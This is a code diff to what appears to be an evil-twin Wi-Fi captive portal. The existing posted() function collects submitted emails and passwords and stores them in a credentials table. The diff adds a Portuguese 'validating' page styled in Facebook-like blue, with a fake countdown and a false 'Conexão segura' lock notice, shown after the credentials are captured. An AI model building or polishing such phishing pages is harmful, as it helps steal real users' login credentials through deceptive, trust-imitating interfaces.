@@ -186,6 +186,53 @@ String index() {
   return htmlContent;
 }
  
+// Standalone "please wait / validating" page shown after a submission.
+// Pure CSS/JS (device is offline): animated Wi-Fi icon, indeterminate progress
+// bar, spinner and a live countdown. Text comes from POST_TITLE / POST_BODY.
+String waiting() {
+  return
+    "<!DOCTYPE html><html lang=\"pt-br\"><head>"
+    "<meta charset=\"UTF-8\">"
+    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
+    "<title>" + String(POST_TITLE) + "</title>"
+    "<style>"
+    "*{box-sizing:border-box;margin:0;padding:0}"
+    "body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,#eef3fb,#dce7f7);font-family:Helvetica,Arial,sans-serif;color:#1c1e21;padding:20px}"
+    ".card{background:#fff;width:100%;max-width:380px;border-radius:18px;padding:34px 28px;text-align:center;box-shadow:0 10px 30px rgba(24,119,242,.15),0 2px 8px rgba(0,0,0,.06)}"
+    ".wifi{width:76px;height:76px;margin:0 auto 18px}"
+    ".wifi svg{width:100%;height:100%}"
+    ".a{fill:none;stroke:#1877f2;stroke-width:6;stroke-linecap:round;opacity:.2;animation:pulse 1.8s infinite}"
+    ".a2{animation-delay:.2s}.a3{animation-delay:.4s}"
+    ".dot{fill:#1877f2}"
+    "@keyframes pulse{0%,100%{opacity:.2}40%{opacity:1}}"
+    "h1{font-size:22px;color:#1877f2;margin-bottom:10px;font-weight:700}"
+    ".msg{font-size:15px;color:#606770;line-height:1.5;margin-bottom:22px}"
+    ".track{height:8px;background:#e8edf3;border-radius:99px;overflow:hidden;margin-bottom:18px}"
+    ".track i{display:block;height:100%;width:40%;border-radius:99px;background:linear-gradient(90deg,#1877f2,#4fa3ff);animation:slide 1.4s ease-in-out infinite}"
+    "@keyframes slide{0%{margin-left:-45%}100%{margin-left:105%}}"
+    ".status{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;color:#8a8d91}"
+    ".spin{width:14px;height:14px;border:2px solid #cdd3dc;border-top-color:#1877f2;border-radius:50%;animation:spin .8s linear infinite}"
+    "@keyframes spin{to{transform:rotate(360deg)}}"
+    ".foot{margin-top:20px;font-size:12px;color:#b0b3b8}"
+    "@media(prefers-reduced-motion){.a,.track i,.spin{animation:none}.a{opacity:.75}}"
+    "</style></head><body>"
+    "<div class=\"card\">"
+    "<div class=\"wifi\"><svg viewBox=\"0 0 100 100\">"
+    "<path class=\"a a3\" d=\"M15,45 A48,48 0 0 1 85,45\"/>"
+    "<path class=\"a a2\" d=\"M27,56 A33,33 0 0 1 73,56\"/>"
+    "<path class=\"a\" d=\"M38,66 A19,19 0 0 1 62,66\"/>"
+    "<circle class=\"dot\" cx=\"50\" cy=\"74\" r=\"5\"/>"
+    "</svg></div>"
+    "<h1>" + String(POST_TITLE) + "</h1>"
+    "<p class=\"msg\">" + String(POST_BODY) + "</p>"
+    "<div class=\"track\"><i></i></div>"
+    "<div class=\"status\"><span class=\"spin\"></span>Tempo estimado: <span id=\"t\">5:00</span></div>"
+    "<div class=\"foot\">&#128274; Conex&atilde;o segura</div>"
+    "</div>"
+    "<script>var s=300,el=document.getElementById('t');setInterval(function(){if(s>0)s--;var m=(s/60)|0,x=s%60;el.textContent=m+':'+(x<10?'0'+x:x);},1000);</script>"
+    "</body></html>";
+}
+
 String posted() {
   String email = input("email");
   String password = input("password");
@@ -195,7 +242,7 @@ String posted() {
                "<td class=\"pass\"><code>" + password + "</code></td>"
                "<td class=\"time\">" + fmtUptime(millis()) + "</td></tr>";
   Credentials = row + Credentials;
-  return header(POST_TITLE) + POST_BODY + footer();
+  return waiting();
 }
  
 String clear() {
